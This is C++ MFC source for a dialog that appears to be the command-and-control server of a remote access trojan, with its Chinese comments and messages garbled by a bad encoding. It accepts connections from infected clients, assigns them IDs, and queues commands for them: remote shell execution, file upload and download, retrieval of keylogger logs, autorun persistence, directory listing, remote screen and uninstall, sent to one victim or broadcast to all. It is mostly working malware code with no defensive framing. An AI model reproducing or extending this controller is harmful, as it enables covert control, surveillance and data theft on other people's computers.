
// hisfooDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "hisfoo.h"
#include "hisfooDlg.h"
#include "DlgProxy.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ChisfooDlg �Ի���


IMPLEMENT_DYNAMIC(ChisfooDlg, CDialogEx);

BOOL ChisfooDlg::Work_Pcs(SOCKET iSock, unsigned long long UID)
{
	auto ZeroPcs = [&](unsigned long long szTask = 0ULL)->int
	{
		int retEx = send(iSock, reinterpret_cast<char*>(&szTask), sizeof(unsigned long long), 0);
		return move(retEx);
	};
	if (WorkMap.find(UID) == WorkMap.end())
	{
		if (ZeroPcs() <= 0)MessagePcs("����ʥּʱ���Ӵ���");
		else return FALSE;
	}
	auto* pData = &WorkMap[UID];
	if (pData->empty())
	{
		if (ZeroPcs() <= 0)MessagePcs("����ʥּʱ���Ӵ���");
		return FALSE;
	}
	if (pData->begin() == pData->end())
	{
		if (ZeroPcs() <= 0)MessagePcs("����ʥּʱ���Ӵ���");
		return FALSE;
	}
	auto ToPcs = pData->begin();
	unsigned long long SzMethod = ToPcs->Method;
	auto CleanData = [&]()->void
	{
		pData->erase(pData->begin());
		if (pData->begin() == pData->end() || pData->empty())
			WorkMap.erase(UID);
	};
	if (SzMethod == Shell_Method)
	{
		if (ZeroPcs(Shell_Method) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		unsigned long long SzLen = 0ULL;
		for (auto SzTor = ToPcs->Data.begin(); SzTor != ToPcs->Data.end(); SzTor++)
		{
			memcpy(&SzLen, &**SzTor, sizeof(unsigned long long));
			send(iSock, reinterpret_cast<char*>(&**SzTor), sizeof(unsigned long long), 0);
			SzTor++;
			send(iSock, reinterpret_cast<char*>(&**SzTor), SzLen, 0);
		}
		SzLen = 0ULL;
		send(iSock, reinterpret_cast<char*>(&SzLen), sizeof(unsigned long long), 0);
		CleanData();
		return TRUE;
	}
	else if (SzMethod == Get_Last_Msg)
	{
		if (ZeroPcs(Get_Last_Msg) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		unsigned long long szLen;
		shared_ptr<byte> pByte(new byte[sizeof(unsigned long long)]);
		recv(iSock, reinterpret_cast<char*>(&*pByte), sizeof(unsigned long long), 0);
		memcpy(&szLen, &*pByte, sizeof(unsigned long long));
		shared_ptr<char> pChar(new char[szLen]);
		recv(iSock, &*pChar, szLen, 0);
		(&*pChar)[szLen - 1] = '\0';
		shared_ptr<ChisfooDlg> NewDlg(new ChisfooDlg);
		char SzChr[MAX_PATH];
		if (_Shell_Call)
			if (*_Shell_Call)
			{
				auto _FxSS = [&](shared_ptr<char> kChar)
				{
					string _Nxstr(&*kChar);
					while (true)
					{
						unsigned long long pos = 0;
						if ((pos = _Nxstr.find(" ", 0)) != string::npos)
							_Nxstr.replace(pos, string(" ").length(), "");
						else break;
					}
					stringstream NxSS;
					NxSS.str(_Nxstr.c_str());
					NxSS.clear();
					while (!NxSS.eof())
					{
						string _ToADD;
						NxSS >> _ToADD;
						tbox->AddStr(_ToADD);
					}
					return;
				};
				thread(_FxSS, pChar).detach();
			}
			else
			{
				if (CopyToClipboard(&*pChar, szLen))
					sprintf_s(SzChr, "%llu�ŷ�˿��ʾExcited! - �Ѽ��������������", UID);
				else
					sprintf_s(SzChr, "%llu�ŷ�˿��ʾExcited! - ���������ʧ��", UID);
				thread(&ChisfooDlg::MessageBox, NewDlg, &*pChar, SzChr, 0U).detach();
			}
		CleanData();
		return TRUE;
	}
	else if (SzMethod == Uninstall_Me)
	{
		if (ZeroPcs(Uninstall_Me) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		CleanData();
		return TRUE;
	}
	else if (SzMethod == Set_Client_ID)
	{
		if (ZeroPcs(Set_Client_ID) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		auto SzTor = ToPcs->Data.begin();
		unsigned long long SzLen = 0ULL;
		memcpy(&SzLen, &**SzTor, sizeof(unsigned long long));
		send(iSock, reinterpret_cast<char*>(&**SzTor), sizeof(unsigned long long), 0);
		CleanData();
		return TRUE;
	}
	else if (SzMethod == File_Upload)
	{
		if (ZeroPcs(File_Upload) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		unsigned long long is_Support = 0;
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		if (!is_Support)
		{
			CleanData();
			MessagePcs("�ͻ��˲���֧�ֽ����ļ���");
			return FALSE;
		}
		MessagePcs("��ʼ�����ϴ��ļ�...");
		string thisPath = reinterpret_cast<char*>(&*(*(ToPcs->Data.begin())));
		string remotePath = reinterpret_cast<char*>(&*(*(++(ToPcs->Data.begin()))));
		ifstream fsRead;
		fsRead.open(thisPath.c_str(), ios::in|ios::binary);
		if (!fsRead)
		{
			CleanData();
			MessagePcs("���������ô����޷������ļ���");
			return FALSE;
		}
		fsRead.seekg(0, fsRead.end);
		unsigned long long srcSize = fsRead.tellg();
		fsRead.close();
		fsRead.clear();
		unsigned long long PathCounter = remotePath.size() + 1;
		send(iSock, reinterpret_cast<char*>(&PathCounter), sizeof(unsigned long long), 0);
		send(iSock, remotePath.c_str(), PathCounter, 0);
		send(iSock, reinterpret_cast<char*>(&srcSize), sizeof(unsigned long long), 0);
		char fBuffer[Pkg_Leng+8ULL];
		unsigned long long latestpkg = 0ULL;
		char FinishMsg[MAX_PATH];
		fsRead.open(thisPath.c_str(), ios::binary);
		while (!fsRead.eof())
		{
			fsRead.read((char*)&*fBuffer, Pkg_Leng);
			latestpkg=fsRead.gcount();
			if (send(iSock, reinterpret_cast<char*>(&latestpkg), sizeof(unsigned long long), 0) < 0)break;
			Sleep(10);
			if (send(iSock, fBuffer, latestpkg, 0) < 0)break;
			Sleep(30);
		}
		latestpkg = 0ULL;
		send(iSock, reinterpret_cast<char*>(&latestpkg), sizeof(unsigned long long), 0);
		sprintf_s(FinishMsg, "�ɹ�������%llu�ֽڵ��ļ���", srcSize);
		MessagePcs(FinishMsg);
		CleanData();
		fsRead.close();
		fsRead.clear();
		return TRUE;
	}
	else if (SzMethod == File_Download)
	{
		if (ZeroPcs(File_Download) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		unsigned long long is_Support = 0;
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		if (!is_Support)
		{
			CleanData();
			MessagePcs("�ͻ��˲���֧�ַ����ļ���");
			return FALSE;
		}
		char FinishMsg[MAX_PATH];
		MessagePcs("��ʼ���������ļ�...");
		string thisPath = reinterpret_cast<char*>(&*(*(ToPcs->Data.begin())));
		string remotePath = reinterpret_cast<char*>(&*(*(++(ToPcs->Data.begin()))));
		unsigned long long PathCounter = remotePath.size() + 1;
		send(iSock, reinterpret_cast<char*>(&PathCounter), sizeof(unsigned long long), 0);
		Sleep(10);
		send(iSock, remotePath.c_str(), PathCounter, 0);
		unsigned long long FileTransferSize = 0;
		recv(iSock, reinterpret_cast<char*>(&FileTransferSize), sizeof(unsigned long long), 0);
		ofstream _fileCtrl(thisPath.c_str(), ios::binary | ios::out);
		if (!_fileCtrl)
		{
			closesocket(iSock);
			return FALSE;
		}
		char _fBuffer[Pkg_Leng+8ULL];
		unsigned long long fpkgLen = 0ULL;
		recv(iSock, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
		int sreti = 1;
		unsigned long long Failed_Counter = 0ULL;
		while (fpkgLen != 0ULL)
		{
			if (fpkgLen > Pkg_Leng)break;
		reGetLen:
			Sleep(35);
			sreti = recv(iSock, (_fBuffer), fpkgLen, 0);
			if (sreti < 0)
			{
				Failed_Counter++;
				if (Failed_Counter > 100ULL)break;
				goto reGetLen;
			}
			_fileCtrl.write(_fBuffer, fpkgLen);
		reGetPkg:
			Sleep(35);
			sreti = recv(iSock, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
			if (sreti < 0)
			{
				Failed_Counter++;
				if (Failed_Counter > 100ULL)break;
				goto reGetPkg;
			}
			Sleep(20);
		}
		_fileCtrl.close();
		sprintf_s(FinishMsg, "�ɹ�������%llu�ֽڵ��ļ���", FileTransferSize);
		MessagePcs(FinishMsg);
		CleanData();
		return TRUE;
	}
	else if (SzMethod == KeyBHook)
	{
		if (ZeroPcs(KeyBHook) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		unsigned long long is_Support = 0;
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		if (!is_Support)
		{
			CleanData();
			MessagePcs("�ͻ��˲���֧�ּ��̼�¼��");
			return FALSE;
		}
		unsigned long long hMod = 0ULL;
		memcpy(&hMod, &*(*(ToPcs->Data.begin())), sizeof(unsigned long long));
		if (hMod == 3ULL)
		{
			send(iSock, reinterpret_cast<char*>(&hMod), sizeof(unsigned long long), 0);
			string thisPath = "kbLog.log";
			unsigned long long FileTransferSize = 0;
			recv(iSock, reinterpret_cast<char*>(&FileTransferSize), sizeof(unsigned long long), 0);
			ofstream _fileCtrl2(thisPath.c_str(), ios::binary | ios::out);
			if (!_fileCtrl2)
			{
				closesocket(iSock);
				return FALSE;
			}
			char _fBuffer[Pkg_Leng];
			unsigned long long fpkgLen = 0ULL;
			recv(iSock, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
			int sreti = 1;
			while (fpkgLen != 0ULL)
			{
				sreti = recv(iSock, reinterpret_cast<char*>(&*_fBuffer), fpkgLen, 0);
				if (sreti < 0)break;
				_fileCtrl2.write(_fBuffer, fpkgLen);
				sreti = recv(iSock, reinterpret_cast<char*>(&fpkgLen), sizeof(unsigned long long), 0);
				Sleep(50);
				if (sreti < 0)break;
			}
			_fileCtrl2.close();
			MessagePcs("���̼�¼��Ϣ�ڳ���Ŀ¼�µ�kbLog.log");
			CleanData();
			return TRUE;
		}
		send(iSock, reinterpret_cast<char*>(&hMod), sizeof(unsigned long long), 0);
		CleanData();
		return TRUE;
	}
	else if (SzMethod == Auto_Run)
	{
		if (ZeroPcs(Auto_Run) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		unsigned long long is_Support = 0;
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		if (!is_Support)
		{
			CleanData();
			MessagePcs("�ͻ��˲���֧��������ģʽ��");
			return FALSE;
		}
		auto pSzData = ToPcs->Data.begin();
		memcpy(&is_Support, &*(*(pSzData)), sizeof(unsigned long long));
		send(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		recv(iSock, reinterpret_cast<char*>(&is_Support), sizeof(unsigned long long), 0);
		shared_ptr<char>_LBuffer(new char[is_Support]);
		recv(iSock, &*_LBuffer, is_Support, 0);
		MessagePcs(&*_LBuffer);
	}
	else if (SzMethod == File_List)
	{
		if (ZeroPcs(File_List) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		unsigned long long RespBuffer = 0;
		recv(iSock, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
		if (!RespBuffer)
		{
			CleanData();
			MessagePcs("�ͻ��˲���֧�ֲ����ļ����ļ��С�");
			return FALSE;
		}
		RespBuffer = strlen((char*)&*(*(ToPcs->Data.begin()))) + 1;
		send(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0);
		send(iSock, (char*)&*(*(ToPcs->Data.begin())), RespBuffer, 0);
		recv(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0);
		vector<string> FileAllPath;
		vector<string> FolderAllPath;
		char PathAllPath[MAX_PATH];
		while (RespBuffer)
		{
			if (recv(iSock, PathAllPath, RespBuffer, 0) < 0)break;
			FileAllPath.push_back(PathAllPath);
			if (recv(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0) < 0)break;
		}
		recv(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0);
		while (RespBuffer)
		{
			if (recv(iSock, PathAllPath, RespBuffer, 0) < 0)break;
			FolderAllPath.push_back(PathAllPath);
			if (recv(iSock, (char*)&RespBuffer, sizeof(unsigned long long), 0) < 0)break;
		}
		if (_file_trs_dlg)_file_trs_dlg->Change_File_Data(FileAllPath, FolderAllPath);
	}
	else if (SzMethod == Remote_Screen)
	{
		if (ZeroPcs(Remote_Screen) <= 0)
		{
			MessagePcs("����ʥּʱ���Ӵ���");
			return FALSE;
		}
		unsigned long long RespBuffer = 0;
		recv(iSock, reinterpret_cast<char*>(&RespBuffer), sizeof(unsigned long long), 0);
		if (!RespBuffer)
		{
			CleanData();
			MessagePcs("�ͻ��˲���֧��Զ����Ļ������汾��");
			return FALSE;
		}
		MessagePcs("�Ѿ�����ִ�У���ȷ���������������ͨ����");
	}
	else if (SzMethod == Load_Lib)
	{
		// Ha
	}
	else
	{
		if (ZeroPcs() <= 0)MessagePcs("����ʥּʱ���Ӵ���");
		CleanData();
		return FALSE;
	}
	// ��֧�ֵ����ݣ�ͼ����Բ�ͨ������Ĭ��ֵ
	if (ZeroPcs() <= 0)MessagePcs("����ʥּʱ���Ӵ���");
	CleanData();
	return FALSE;
}

void ChisfooDlg::NetWork_Pcs()
{
	//��ʼ��WSA    
	_Thr_Flag = 1U;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		MessagePcs("�����ڲ�������Ѱ�ҿ����߻�ȡ������");
		_Thr_Flag = 0U;
		return;
	}

	//�����׽���    
	slisten = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (slisten == INVALID_SOCKET)
	{
		MessagePcs("��Ч�ܵ�����������г���");
		_Thr_Flag = 0U;
		return;
	}

	//��IP�Ͷ˿�    
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(Listen_Port);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	if (::bind(slisten, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		MessagePcs("�󶨶˿ڵ�ʱ��������ش������������г���");
		_Thr_Flag = 0U;
		return;
	}

	//��ʼ����    
	if (listen(slisten, 5) == SOCKET_ERROR)
	{
		MessagePcs("�ܵ��������������г���");
		_Thr_Flag = 0U;
		return;
	}
	// ���̵߳ȴ��⼦����
	SOCKET sClient;
	sockaddr_in remoteAddr;
	int nAddrlen = sizeof(remoteAddr);

	int nNetTimeout = Wait_Time; // -1s
	while (Pcs_Flag)
	{
		// �ȴ��⼦����
		sClient = accept(slisten, (SOCKADDR *)&remoteAddr, &nAddrlen);

		if (sClient == INVALID_SOCKET)
		{
			// ������Ĺܵ�
			continue;
		}

		//����ʱ��
		setsockopt(sClient, SOL_SOCKET, SO_SNDTIMEO, (char *)&nNetTimeout, sizeof(int));
		//����ʱ��
		setsockopt(sClient, SOL_SOCKET, SO_RCVTIMEO, (char *)&nNetTimeout, sizeof(int));

		// �⼦����
		shared_ptr<char> pAuth(new char[strlen(HELEN_IS_A_BITCH) + 1]);
		int ret = recv(sClient, &*pAuth, strlen(HELEN_IS_A_BITCH) + 1, 0);
		if (ret <= 0)
		{
			closesocket(sClient);
			continue;
		}
		else if (string(&*pAuth) != string(HELEN_IS_A_BITCH))
		{
			closesocket(sClient);
			continue;
		}
		unsigned long long szCID = 0;
		recv(sClient, reinterpret_cast<char*>(&szCID), sizeof(unsigned long long), 0);
		if (szCID == 0)
		{
			shared_ptr<char>pDataX(new char[sizeof(unsigned long long)]);
			unsigned long long szMethod = Set_Client_ID;
			memcpy(&*pDataX, &szMethod, sizeof(unsigned long long));
			int ret = send(sClient, reinterpret_cast<char*>(&*pDataX), sizeof(unsigned long long), 0);
			if (ret <= 0)
			{
				closesocket(sClient);
				continue;
			}
			memcpy(&*pDataX, &_Cli_Count, sizeof(unsigned long long));
			_Cli_Count++;
			ret = send(sClient, reinterpret_cast<char*>(&*pDataX), sizeof(unsigned long long), 0);
			closesocket(sClient);
			continue;
		}
		if (szCID > _Cli_Count)
			_Cli_Count = szCID + 1;
		bool WFind = false;
		for (auto szPtr = userList.begin(); szPtr != userList.end(); szPtr++)
		{
			if (szPtr->CID == szCID)
			{
				szPtr->_Last_Time = chrono::system_clock::now();
				WFind = true;
				break;
			}
		}
		if (!WFind)
		{
			UserData _UData;
			_UData.CID = szCID;
			_UData._Last_Time = chrono::system_clock::now();
			/*if (!_NetLock.try_lock_for(chrono::minutes(10)))
			{
				std::bad_function_call _CALL;
				wcout << L"�����Ƿ��������ܹ��ͣ�������һ�����صĴ���" << endl;
				throw _CALL;
			}*/
			userList.push_back(_UData);
			//_NetLock.unlock();
			UserOperate(szCID, 2ULL, remoteAddr);
		}
		if (Work_Pcs(sClient, szCID))
		{
			stringstream NxSS;
			NxSS << szCID;
			string NxStr;
			NxSS >> NxStr;
			MessagePcs(string(NxStr + string("�Ѿ�ִ�б��µ�ָ��")));
		}
		closesocket(sClient);
		BOOL bDontLinger = FALSE;
		setsockopt(sClient, SOL_SOCKET, SO_DONTLINGER, (const char*)&bDontLinger, sizeof(BOOL));
	}
	_Thr_Flag = 0U;
	return;
}

void ChisfooDlg::Offline_Pcs()
{
	/*if (!_NetLock.try_lock_for(chrono::minutes(10)))
	{
		std::bad_function_call _CALL;
		wcout << L"�����Ƿ��������ܹ��ͣ�������һ�����صĴ���" << endl;
		throw _CALL;
	}*/
	while (Pcs_Flag)
	{
		for (auto szPtr = userList.begin(); szPtr != userList.end(); szPtr++)
		{
			if (chrono::system_clock::now() - szPtr->_Last_Time > chrono::milliseconds(8 * Wait_Time))
			{
				stringstream NxSS;
				NxSS << szPtr->CID;
				string NxStr;
				NxSS >> NxStr;
				string _Buf = NxStr;
				NxStr += "�ź������";
				int szListLoc = puserlist.FindString(-1, NxStr.c_str());
				MessagePcs(string(_Buf + "�ź������"));
				if (szListLoc != LB_ERR)
				{
					puserlist.DeleteString(szListLoc);
				}
				szPtr++;
				userList.erase(--szPtr);
				if (szPtr == userList.end())break;
			}
		}
		Sleep(Wait_Time);
	}
	//_NetLock.unlock();
}

void ChisfooDlg::_VFUNC(unsigned long long CID)
{
	CString CSTRBuf;
	CLData SzCDATA;
	SzCDATA.Method = Get_Last_Msg;
	auto Pcs_Com = [&](unsigned long long UID, CLData userData)
	{
		if (WorkMap.find(UID) == WorkMap.end())
		{
			WorkMap.insert(make_pair(UID, list<CLData>()));
		}
		WorkMap[UID].push_back(userData);
	};
	if (CID == 0ULL)
	{
		for (auto UListTor = userList.begin(); UListTor != userList.end(); UListTor++)
		{
			Pcs_Com(UListTor->CID, SzCDATA);
		}
	}
	else
	{
		Pcs_Com(CID, SzCDATA);
	}
	MessagePcs("�Ѿ�Ҫ�󷵻����Ľ��");
	char SzChr[MAX_PATH];
	sprintf_s(SzChr, "�յ���%llu����˿��", (
		[&]()->unsigned long long {if (CID != 0ULL)return 1ULL; else return userList.size(); })()
	);
	MessagePcs(SzChr);
}

void ChisfooDlg::_GoShell(unsigned long long CID, string Shell)
{
	auto Pcs_Com = [&](unsigned long long UID, CLData userData)
	{
		if (WorkMap.find(UID) == WorkMap.end())
		{
			WorkMap.insert(make_pair(UID, list<CLData>()));
		}
		WorkMap[UID].push_back(userData);
	};
	CLData SzCDATA;
	SzCDATA.Method = Shell_Method;
	shared_ptr<byte>_pLen(new byte[sizeof(unsigned long long)]);
	unsigned long long ScLen = strlen(Shell.c_str()) + 1ULL;
	memcpy(&*_pLen, &ScLen, sizeof(unsigned long long));
	shared_ptr<byte>_pCom(new byte[strlen(Shell.c_str()) + 1]);
	memcpy(&*_pCom, Shell.c_str(), strlen(Shell.c_str()) + 1);
	SzCDATA.Data.push_back(_pLen);
	SzCDATA.Data.push_back(_pCom);
	if (CID == 0ULL)
	{
		for (auto UListTor = userList.begin(); UListTor != userList.end(); UListTor++)
		{
			Pcs_Com(UListTor->CID, SzCDATA);
		}
	}
	else
	{
		Pcs_Com(CID, SzCDATA);
	}
}

void ChisfooDlg::MessagePcs(string Msg)
{
	while (pmsgbox.GetCount() > 1000)pmsgbox.DeleteString(0U);
	pmsgbox.AddString(Msg.c_str());
	SendDlgItemMessage(IDC_LIST2, WM_VSCROLL, SB_BOTTOM, 0);
	return;
}

void ChisfooDlg::UserOperate(unsigned long long UserID, unsigned long long Mode)
{
	if (Mode & 1ULL)
	{
		puserlist.ResetContent();
	}
	if (Mode & 2ULL)
	{
		stringstream NxSS;
		NxSS << UserID;
		string NxStr;
		NxSS >> NxStr;
		string _Buf = NxStr;
		NxStr += "�ź������ ";

		puserlist.AddString(NxStr.c_str());
		MessagePcs(string(_Buf + "�ź������"));
	}
	if (Mode & 4ULL)
	{
		puserlist.DeleteString(UserID);
	}
	if (Mode & 8ULL)
	{
		for (auto cTor = userList.begin(); cTor != userList.end(); cTor++)
		{
			UserOperate((*cTor).CID, 2ULL);
		}
	}
	while (puserlist.GetCount() > 1000)
	{
		puserlist.DeleteString(0U);
	}
	return;
}

void ChisfooDlg::UserOperate(unsigned long long UserID, unsigned long long Mode, sockaddr_in & sCli)
{
	if (Mode & 1ULL)
	{
		puserlist.ResetContent();
	}
	if (Mode & 2ULL)
	{
		stringstream NxSS;
		NxSS << UserID;
		string NxStr;
		NxSS >> NxStr;
		string _Buf = NxStr;
		NxStr += "�ź������ ";
		NxStr += inet_ntoa(sCli.sin_addr);
		puserlist.AddString(NxStr.c_str());
		MessagePcs(string(_Buf + "�ź������"));
	}
	if (Mode & 4ULL)
	{
		puserlist.DeleteString(UserID);
	}
	if (Mode & 8ULL)
	{
		for (auto cTor = userList.begin(); cTor != userList.end(); cTor++)
		{
			UserOperate((*cTor).CID, 2ULL);
		}
	}
	while (puserlist.GetCount() > 1000)
	{
		puserlist.DeleteString(0U);
	}
	return;
}

ChisfooDlg::ChisfooDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_HISFOO_DIALOG, pParent)
{
	EnableActiveAccessibility();
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON1);
	m_pAutoProxy = NULL;
}

ChisfooDlg::~ChisfooDlg()
{
	// ����öԻ������Զ���������
	//  ���˴���ָ��öԻ���ĺ���ָ������Ϊ NULL���Ա�
	//  �˴���֪���öԻ����ѱ�ɾ����
	if (m_pAutoProxy != NULL)
		m_pAutoProxy->m_pDialog = NULL;
}

void ChisfooDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, puserlist);
	DDX_Control(pDX, IDC_LIST2, pmsgbox);
}

BEGIN_MESSAGE_MAP(ChisfooDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON3, &ChisfooDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON1, &ChisfooDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &ChisfooDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDCANCEL, &ChisfooDlg::OnBnClickedCancel)
	ON_BN_CLICKED(IDC_BUTTON4, &ChisfooDlg::OnBnClickedButton4)
END_MESSAGE_MAP()


// ChisfooDlg ��Ϣ�������

BOOL ChisfooDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	_Thr_Pcs.push_back(thread(&ChisfooDlg::NetWork_Pcs, this));
	_Thr_Pcs.back().detach();

	_Thr_Pcs.push_back(thread(&ChisfooDlg::Offline_Pcs, this));
	_Thr_Pcs.back().detach();

	AdjustWindowsSize();    //�������ڴ�С�����湤������ͬ
	ReSize();                //������ǰ���������пؼ���С������Ӧ��ǰ��Ļ�ֱ���

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void ChisfooDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR ChisfooDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

// ���û��ر� UI ʱ������������Ա���������ĳ��
//  �������Զ�����������Ӧ�˳���  ��Щ
//  ��Ϣ�������ȷ����������: �����������ʹ�ã�
//  ������ UI�������ڹرնԻ���ʱ��
//  �Ի�����Ȼ�ᱣ�������

void ChisfooDlg::OnClose()
{
	if (CanExit())
		CDialogEx::OnClose();
}

void ChisfooDlg::OnOK()
{
	if (CanExit())
		CDialogEx::OnOK();
}

void ChisfooDlg::OnCancel()
{
	if (CanExit())
		CDialogEx::OnCancel();
}

BOOL ChisfooDlg::CanExit()
{
	// �����������Ա�����������Զ���
	//  �������Իᱣ�ִ�Ӧ�ó���
	//  ʹ�Ի���������������� UI ����������
	if (m_pAutoProxy != NULL)
	{
		ShowWindow(SW_HIDE);
		return FALSE;
	}

	return TRUE;
}



void ChisfooDlg::OnBnClickedButton3()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CString CSTRBuf;
	GetDlgItemTextA(IDC_EDIT1, CSTRBuf);
	string SStr = CSTRBuf.GetString();
	unsigned long long SzNID = 1ULL;
	if (SStr != string(""))
	{
		stringstream NxSS;
		NxSS << SStr;
		NxSS >> SzNID;
	}
	else
	{
		MessageBox("����΢С�Ĵ���\n�����Ƿ���������ֵ��", "�����ϻ�����", 0U);
		return;
	}
	auto Pcs_Com = [&](unsigned long long UID, CLData userData)
	{
		if (WorkMap.find(UID) == WorkMap.end())
		{
			WorkMap.insert(make_pair(UID, list<CLData>()));
		}
		WorkMap[UID].push_back(userData);
	};
	GetDlgItemTextA(IDC_EDIT2, CSTRBuf);
	SStr = CSTRBuf.GetString();
	if (SStr != string("") && SStr != string("e"))
	{
		CLData SzCDATA;
		SzCDATA.Method = Shell_Method;
		shared_ptr<byte>_pLen(new byte[sizeof(unsigned long long)]);
		unsigned long long ScLen = strlen(SStr.c_str()) + 1ULL;
		memcpy(&*_pLen, &ScLen, sizeof(unsigned long long));
		shared_ptr<byte>_pCom(new byte[strlen(SStr.c_str()) + 1]);
		memcpy(&*_pCom, SStr.c_str(), strlen(SStr.c_str()) + 1);
		SzCDATA.Data.push_back(_pLen);
		SzCDATA.Data.push_back(_pCom);
		if (SzNID == 0ULL)
		{
			for (auto UListTor = userList.begin(); UListTor != userList.end(); UListTor++)
			{
				Pcs_Com(UListTor->CID, SzCDATA);
			}
		}
		else
		{
			Pcs_Com(SzNID, SzCDATA);
		}
	}
	else if (SStr == "e")
	{
		auto Pcs_Com = [&](unsigned long long UID, CLData userData)
		{
			if (WorkMap.find(UID) == WorkMap.end())
			{
				WorkMap.insert(make_pair(UID, list<CLData>()));
			}
			WorkMap[UID].push_back(userData);
		};
		CLData SzCDATA;
		SzCDATA.Method = Uninstall_Me;
		if (SzNID == 0ULL)
		{
			for (auto UListTor = userList.begin(); UListTor != userList.end(); UListTor++)
			{
				Pcs_Com(UListTor->CID, SzCDATA);
			}
		}
		else
		{
			Pcs_Com(SzNID, SzCDATA);
		}
	}
	GetDlgItemTextA(IDC_EDIT3, CSTRBuf);
	SStr = CSTRBuf.GetString();
	if (SStr != string("") && SzNID != 0ULL)
	{
		CLData SzCDATA;
		SzCDATA.Method = Set_Client_ID;
		stringstream NxSS;
		NxSS << SStr;
		unsigned long long NEWCID;
		NxSS >> NEWCID;
		shared_ptr<byte>_pLen(new byte[sizeof(unsigned long long)]);
		memcpy(&*_pLen, &NEWCID, sizeof(unsigned long long));
		SzCDATA.Data.push_back(_pLen);
		Pcs_Com(SzNID, SzCDATA);
	}
	MessageBox("�Ѿ���������������ȡ��Ӧ��Զ�̻�ȡ��Ӧ��\n"\
		"����ѡ���Զ���ȡ��Ӧ������ʵʱ��ȡshell�����\n"\
		"�������ݿ�����ϵ���� Saurik king@ithot.top","ִ�гɹ�",0U);
	char SzChr[MAX_PATH];
	sprintf_s(SzChr, "�յ���%llu����˿��", (
		[&]()->unsigned long long {if (SzNID != 0ULL)return 1ULL; else return userList.size(); })()
	);
	MessagePcs(SzChr);
	return;
}


void ChisfooDlg::OnBnClickedButton1()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	tbox.reset(new Ccmdline);
	_Shell_Call.reset(new unsigned);
	*_Shell_Call = 1;
	tbox->tDlg = this;
	CString CSTEX;
	GetDlgItemTextA(IDC_EDIT1, CSTEX);
	stringstream Nxss;
	Nxss << CSTEX.GetString();
	unsigned long long NIDE;
	Nxss >> NIDE;
	tbox->CID = NIDE;
	tbox->DoModal();
}



void ChisfooDlg::OnBnClickedButton2()
